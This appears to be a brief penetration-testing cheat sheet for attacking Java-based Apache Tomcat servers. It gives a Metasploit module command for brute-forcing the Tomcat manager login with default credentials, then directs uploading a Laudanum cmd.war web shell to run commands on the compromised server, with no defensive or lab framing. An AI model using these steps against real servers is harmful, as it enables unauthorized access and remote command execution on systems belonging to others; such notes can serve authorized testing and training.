Java-based web application server

## Exploit
Get access to the tomcat manager area by trying default credentials.

	msf > use auxiliary/scanner/http/tomcat_mgr_login	
		set STOP_ON_SUCCESS true

### After getting access to the tomcat manager area:
Upload cmd.war into the server and execute it by accessing its location via the website.

	/usr/share/laundanum
	/usr/share/laundanum/jsp
	/usr/share/laundanum/jsp/cmd.war -> creates a shell that allows to run commands on the server
	or

	search for "tomcat manager area exploit"